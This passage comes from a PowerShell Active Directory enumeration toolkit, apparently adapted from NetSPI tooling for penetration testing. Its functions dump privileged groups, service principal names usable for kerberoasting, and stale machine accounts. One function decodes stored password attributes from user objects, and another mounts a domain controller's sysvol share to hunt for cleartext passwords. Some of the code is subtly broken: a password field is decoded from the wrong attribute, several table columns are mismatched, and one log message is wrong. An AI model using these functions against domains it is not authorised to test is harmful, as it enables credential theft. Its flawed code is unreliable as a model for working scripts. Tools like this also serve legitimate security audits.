        $TableFSMORoles = New-Object System.Data.DataTable 
        $TableFSMORoles.Columns.Add("cn") | Out-Null
        $TableFSMORoles.Columns.Add("distinguishedname") | Out-Null
        $TableFSMORoles.Columns.Add("fsmoroleowner") | Out-Null
        $TableFSMORoles.Clear()
    }

    Process
    {
        try{

            # Get results
            $FSMORoles = Get-DomainObject -LdapFilter "(&(objectClass=*)(fSMORoleOwner=*))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $FSMORoles | ForEach-Object {
                
                # Add results to table
                $TableFSMORoles.Rows.Add(
                [string]$_.properties.cn,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.fsmoroleowner
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableFSMORoles.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the domain FSMO Roles."
            Return $TableFSMORoles 
        }else{
            Write-Verbose "Unable to dump the domain account policy."
        }
    }
}

# -------------------------------------------
# Function: Get-DomainGroupProtected
# ------------------------------------------- 
function Get-DomainGroupProtected
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD Protected Groups..."

        # Create table for results
        $TableProtectedGroups = New-Object System.Data.DataTable 
        $TableProtectedGroups.Columns.Add("cn") | Out-Null
        $TableProtectedGroups.Columns.Add("distinguishedname") | Out-Null
        $TableProtectedGroups.Columns.Add("fsmoroleowner") | Out-Null
        $TableProtectedGroups.Clear()
    }

    Process
    {
        try{

            # Get results
            $ProtectedGroups = Get-DomainObject -LdapFilter "(&(adminCount=1)(|(groupType=-2147483646)(groupType=-2147483644)(groupType=-2147483640)(groupType=6)(groupType=4)(groupType=0)))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $ProtectedGroups | ForEach-Object {

                # Add results to table
                $TableProtectedGroups.Rows.Add(
                [string]$_.properties.cn,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.memberof
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableProtectedGroups.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD protected groups."
            Return $TableProtectedGroups 
        }else{
            Write-Verbose "Unable to dump the AD protected groups."
        }
    }
}

# -------------------------------------------
# Function: Get-DomainComputerOldPw
# -------------------------------------------
# https://blogs.technet.microsoft.com/askds/2009/02/15/machine-account-password-process-2/
# Machine account password should be change every 30 days default - set by GPO
# Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options 
# Domain member: Maximum machine account password age 
function Get-DomainComputerOldPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD machine accounts with password ages greater than 45 days..."

        # Create table for results
        

        $TableBackdooredComputerAccounts = New-Object System.Data.DataTable 
        $TableBackdooredComputerAccounts.Columns.Add("objectsid") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("samaccountname") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("dnshostname") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("cn") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("OperatingSystem") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("ServicePack") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("Description") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("MemeberOf") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("LapsPassword") | Out-Null
        $TableBackdooredComputerAccounts.Columns.Add("AdminCount") | Out-Null
        $TableBackdooredComputerAccounts.Clear()
    }

    Process
    {
        try{

            # Get results
            $SixtyDaysAgo = (Get-Date).AddDays(-45).ToFileTimeUtc()
            $BackdooredComputerAccounts = Get-DomainObject -LdapFilter "(&(sAMAccountType=805306369)(pwdlastset<=$SixtyDaysAgo))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $BackdooredComputerAccounts | ForEach-Object {
                # Add results to table
                $TableBackdooredComputerAccounts.Rows.Add(
                [string]$_.properties.objectsid,
                [string]$_.properties.samaccountname,
                [string]$_.properties.dnshostname,
                [string]$_.properties.cn,
                [string]$_.properties.OperatingSystem,
                [string]$_.properties.ServicePack,
                [string]$_.properties.Description,
                [string]$_.properties.MemeberOf,
                [string]$_.properties.LapsPassword,
                [string]$_.properties.AdminCount
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableBackdooredComputerAccounts.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD machine accounts with passwords ages greater than 45 days."
            Return $TableBackdooredComputerAccounts 
        }else{
            Write-Verbose "Unable to dump the AD machine accounts with passwords ages greater than 45 days."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUserPwNeverExpire
# -------------------------------------------
# Ref: https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/Audit/Audit.psm1
function Get-DomainUserPwNeverExpire
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {

        Write-Verbose "Getting domain users with passwords that do not expire..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {          
        
            # Setup table for domain users
            $TableDomainUsers = New-Object System.Data.DataTable
            $TableDomainUsers.Columns.Add("objectsid") | Out-Null
            $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
            $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
            $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
            $TableDomainUsers.Columns.Add("displayname") | Out-Null
            $TableDomainUsers.Columns.Add("givenname") | Out-Null
            $TableDomainUsers.Columns.Add("sn") | Out-Null
            $TableDomainUsers.Columns.Add("description") | Out-Null
            $TableDomainUsers.Columns.Add("admincount") | Out-Null
            $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
            $TableDomainUsers.Columns.Add("memberof") | Out-Null
            $TableDomainUsers.Clear()

            # Setup the LDAP filter
            $CompFilter = "(userAccountControl:1.2.840.113556.1.4.803:=65536)"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }

            # Add domain user information to table
            $ObjSearcher.FindAll() | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }

            # Check for domain users
            if($TableDomainUsers.Rows.Count -gt 0)
            {
                $TableDomainUsersCount = $TableDomainUsers.Rows.Count
                Write-Verbose "$TableDomainUsersCount domain users found."
                Return $TableDomainUsers
            }else{
                Write-Verbose "0 domain users were found."
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {

    }
}

# -------------------------------------------
# Function: Get-DomainGPO
# ------------------------------------------- 
function Get-DomainGPO
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD user account with passwords not set to expire..."

        # Create table for results
        
        $TableGroupPolicyObjects = New-Object System.Data.DataTable         
        $TableGroupPolicyObjects.Columns.Add('displayName') | Out-Null
        $TableGroupPolicyObjects.Columns.Add('distinguishedName') | Out-Null
        $TableGroupPolicyObjects.Columns.Add('gPCFileSysPath') | Out-Null
        $TableGroupPolicyObjects.Columns.Add('gPCUserExtensionNames') | Out-Null
        $TableGroupPolicyObjects.Columns.Add('gPCMachineExtensionNames') | Out-Null         
        $TableGroupPolicyObjects.Clear()
    }

    Process
    {
        try{

            # Get results
            $GroupPolicyObjects = Get-DomainObject -LdapFilter "(&(objectClass=groupPolicyContainer))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $GroupPolicyObjects | ForEach-Object {
                # Add results to table
                $TableGroupPolicyObjects.Rows.Add(
                [string]$_.properties.displayname,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.gpcfilesyspath,
                [string]$_.properties.gpcuserextensionnames,
                [string]$_.properties.gpcmachineextensionnames
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableGroupPolicyObjects.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD GPOs."
            Return $TableGroupPolicyObjects 
        }else{
            Write-Verbose "Unable to dump the AD GPOs."
        }
    }
}

# -------------------------------------------
# Function: Get-AdminServicePrincipalNames
# ------------------------------------------- 
function Get-AdminServicePrincipalNames
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD Protected Users with assigned SPNs"

        # Create table for results
        
        $TableUserServicePrincipalNames = New-Object System.Data.DataTable         
        $TableUserServicePrincipalNames.Columns.Add('sAMAccountName') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('cn') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('description') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('distinguishedName') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('memberOf') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('servicePrincipalName') | Out-Null      
        $TableUserServicePrincipalNames.Clear()
    }

    Process
    {
        try{

            # Get results
            $UserServicePrincipalNames = Get-DomainObject -LdapFilter "(&(sAMAccountType=805306368)(adminCount=1)(servicePrincipalName=*))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserServicePrincipalNames | ForEach-Object {
                # Add results to table
                $TableUserServicePrincipalNames.Rows.Add(
                [string]$_.properties.samaccountname,
                [string]$_.properties.cn,
                [string]$_.properties.description,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.memberof,
                [string]$_.properties.serviceprincipalname

                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableUserServicePrincipalNames.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD Protected Users SPNs."
            Return $TableUserServicePrincipalNames 
        }else{
            Write-Verbose "Unable to dump the AD Protected Users SPNs."
        }
    }
}

# -------------------------------------------
# Function: Get-DomainUserSPN
# ------------------------------------------- 
function Get-DomainUserSPN
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD Users with assigned SPNs"

        # Create table for results
        
        $TableUserServicePrincipalNames = New-Object System.Data.DataTable         
        $TableUserServicePrincipalNames.Columns.Add('sAMAccountName') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('cn') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('description') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('distinguishedName') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('memberOf') | Out-Null
        $TableUserServicePrincipalNames.Columns.Add('servicePrincipalName') | Out-Null      
        $TableUserServicePrincipalNames.Clear()
    }

    Process
    {
        try{

            # Get results
            $UserServicePrincipalNames = Get-DomainObject -LdapFilter "(&(sAMAccountType=805306368)(servicePrincipalName=*))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserServicePrincipalNames | ForEach-Object {
                # Add results to table
                $TableUserServicePrincipalNames.Rows.Add(
                [string]$_.properties.samaccountname,
                [string]$_.properties.cn,
                [string]$_.properties.description,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.memberof,
                [string]$_.properties.serviceprincipalname

                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableUserServicePrincipalNames.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD user SPNs."
            Return $TableUserServicePrincipalNames 
        }else{
            Write-Verbose "Unable to dump the AD user SPNs."
        }
    }
}

# -------------------------------------------
# Function: Get-DomainComputerSPN
# ------------------------------------------- 
function Get-DomainComputerSPN
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN
    )

    Begin
    {
        Write-Verbose "Getting AD Computers with assigned SPNs"

        # Create table for results
        
        $TableMachineServicePrincipalNames = New-Object System.Data.DataTable         
        $TableMachineServicePrincipalNames.Columns.Add('sAMAccountName') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('cn') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('dNSHostName') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('distinguishedName') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('operatingSystem') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('operatingSystemHotfix') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('operatingSystemServicePack') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('operatingSystemVersion') | Out-Null
        $TableMachineServicePrincipalNames.Columns.Add('servicePrincipalName') | Out-Null      
        $TableMachineServicePrincipalNames.Clear()
    }

    Process
    {
        try{

            # Get results
            $MachineServicePrincipalNames = Get-DomainObject -LdapFilter "(&(sAMAccountType=805306369)(servicePrincipalName=*))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $MachineServicePrincipalNames | ForEach-Object {
                # Add results to table
                $TableMachineServicePrincipalNames.Rows.Add(
                [string]$_.properties.samaccountname,
                [string]$_.properties.cn,
                [string]$_.properties.dnshostname,
                [string]$_.properties.distinguishedname,
                [string]$_.properties.operatingsystem,
                [string]$_.properties.operatingsystemhotfix,
                [string]$_.properties.operatingsystemversion,
                [string]$_.properties.serviceprincipalname
                ) | Out-Null
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        } 
    }

    End
    {
        # Check for results
        if($TableMachineServicePrincipalNames.Rows.Count -gt 0)
        {
            Write-Verbose "Successfully dumped the AD computer SPNs."
            Return $TableMachineServicePrincipalNames 
        }else{
            Write-Verbose "Unable to dump the AD computer SPNs."
        }
    }
}

 # -------------------------------------------
# Function: Get-DomainUserDecodedPassword
# -------------------------------------------
# Based on Get-AdDecodedPassword.psm1 @ https://github.com/NetSPI/PowerShell/blob/master/Get-AdDecodedPassword.psm1
function Get-DomainUserDecodedPassword
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting list of domain accounts to decode passwords..."

        # Setup table for decoded passwords
        $TableUnixPasswords = New-Object System.Data.DataTable
        $TableUnixPasswords.Columns.Add("SamAccountName") | Out-Null
        $TableUnixPasswords.Columns.Add("Description") | Out-Null
        $TableUnixPasswords.Columns.Add("UnixUserPassword") | Out-Null
        $TableUnixPasswords.Columns.Add("UserPassword") | Out-Null
        $TableUnixPasswords.Columns.Add("unicodePwd") | Out-Null
        $TableUnixPasswords.Columns.Add("msSFU30Name") | Out-Null
        $TableUnixPasswords.Columns.Add("msSFU30Password") | Out-Null
        $TableUnixPasswords.Columns.Add("os400Password") | Out-Null
        $TableUnixPasswords.Clear() # Other info in os400-text, os400-profile, os400-owner, os400-pwdexp
    }

    Process
    {
        try
        {          
            # Get results
            # DirectorySearcher Class (called by Get-DomainObject) *will return all properties* unless DirectorySearcher.PropertiesToLoad is specified. No 'Properties' switch is currently built into DDI's Get-DomainObject, though the new PowerView does have it
            # https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher.propertiestoload?view=netframework-4.8#System_DirectoryServices_DirectorySearcher_PropertiesToLoad
            # https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1
            $EncodedUserPasswords = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User))" -DomainController $DomainController -username $username -password $password -Credential $Credential | 
                Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password, os400-password

            # Parse results
            Write-Verbose "Decoding passwords for each account..."
            $DecodedUserPasswords = $EncodedUserPasswords | ForEach-Object {

                # Grab fields and decode password
                $SamAccountName = $_.samaccountname
                $Description = $_.description
    
                $UnixUserPasswordEnc = $_.UnixUserPassword | ForEach-Object {$_};     
                if($UnixUserPasswordEnc -notlike ""){       
                    $UnixUserPassword = [System.Text.Encoding]::ASCII.GetString($UnixUserPasswordEnc) 
                }else{
                    $UnixUserPassword = ""
                }

                $os400PasswordEnc = $_.UnixUserPassword | ForEach-Object {$_};     
                if($os400PasswordEnc -notlike ""){       
                    $os400Password = [System.Text.Encoding]::ASCII.GetString($os400PasswordEnc) 
                }else{
                    $os400Password = ""
                }
    
                $UserPasswordEnc = $_.UserPassword | ForEach-Object {$_};   
                if($UserPasswordEnc -notlike ""){         
                    $UserPassword = [System.Text.Encoding]::ASCII.GetString($UserPasswordEnc) 
                }else{
                    $UserPassword = ""
                }
       
                $unicodePwdEnc = $_.unicodePwd | ForEach-Object {$_};
                if($unicodePwdEnc -notlike ""){            
                    $unicodePwd = [System.Text.Encoding]::ASCII.GetString($unicodePwdEnc) 
                }else{
                    $unicodePwd = ""
                }
    
                $msSFU30Name = $_.msSFU30Name
                $msSFU30PasswordEnc = $_.msSFU30Password | ForEach-Object {$_}; 
                if ($msSFU30PasswordEnc -notlike ""){           
                    $msSFU30Password = [System.Text.Encoding]::ASCII.GetString($msSFU30PasswordEnc) 
                }else{
                    $msSFU30Password = ""
                }

                # Check if any of the password fields are populated
                if(($UnixUserPassword) -or ($UserPassword) -or ($os400Password) -or ($msSFU30Password) -or ($unicodePwd)){

                    $TableUnixPasswords.Rows.Add( 
                    [string]$SamAccountName,
                    [string]$Description,
                    [string]$UnixUserPassword,
                    [string]$UserPassword,
                    [string]$unicodePwd,
                    [string]$msSFU30Name,
                    [string]$msSFU30Password,  
                    [string]$os400Password # Other info in os400-text, os400-profile, os400-owner, os400-pwdexp
                    ) | Out-Null
                    }                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableUnixPasswords.Rows.Count -gt 0)
        {
            $TableUnixPasswordsCount = $TableUnixPasswords.Rows.Count
            Write-Verbose "Decoded passwords for $TableUnixPasswordsCount domain accounts found."
            Return $TableUnixPasswords
        }else{
            Write-Verbose "0 decoded passwords were found."
        }
    }
} 

#requires -version 5

# ----------------------------------
#  Get-GPRegistryPolicy
# ----------------------------------
# Parsing functions are based on https://github.com/PowerShell/GPRegistryPolicyParser by Zia Jalali.
# Wrapper and Modifications by Scott Sutherland (@_nullbind), NETSPI
# Modified for DDI 04/03/2020
Function  Get-GPRegistryPolicy
{
    <#
            .SYNOPSIS
            This script can be used to find and parse registry.pol files stored on domain controllers.
            In some cases it can be used to identify cleartext passwords.
            This is just a wrapper for https://github.com/PowerShell/GPRegistryPolicyParser.
            By default this will write discovery registries entries to a .csv file.
            .PARAMETER Domain
            Set specific domain.
            .PARAMETER DomainController
            Set specific domain controller.
            .Example
            Get-GPRegistryPolicy -Verbose
            .Example
            Get-GPRegistryPolicy -Verbose -Domain domain.com -DomainController 192.168.1.5
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set specific domain.  This is set to the userdnsdomain by default')]
        [string]$Domain,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Set specific domain controller. This is set to the logon server by default.')]
        [string]$DomainController
    )


    Process
    {

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Ensure that machine is domain joined and script is running as a domain account, or a credential has been provided
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        # Domain Name
        if(-not $Domain){
            $Domain = $env:USERDNSDOMAIN
        }

        # -------------------------------------------------------------------------------------
        # Authenticate to DC & mount sysvol share - taken from Function: Get-DomainPasswordsGPP
        # -------------------------------------------------------------------------------------
 
        # Set target DC
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        # Create randomish name for dynamic mount point 
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("",$result)        
        $DrivePath = "$TargetDC\sysvol"

        # Map a temp drive to the DC sysvol share
        Write-Verbose "Starting Get-GPRegistryPolicy..."
        Write-Verbose "Creating temp drive $DriveName mapped to $DrivePath..."
        If ($Credential.UserName){
        
            # Mount the drive
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            # Create a temp drive mapping
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }

        # Verify temp drive mounted
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName"}
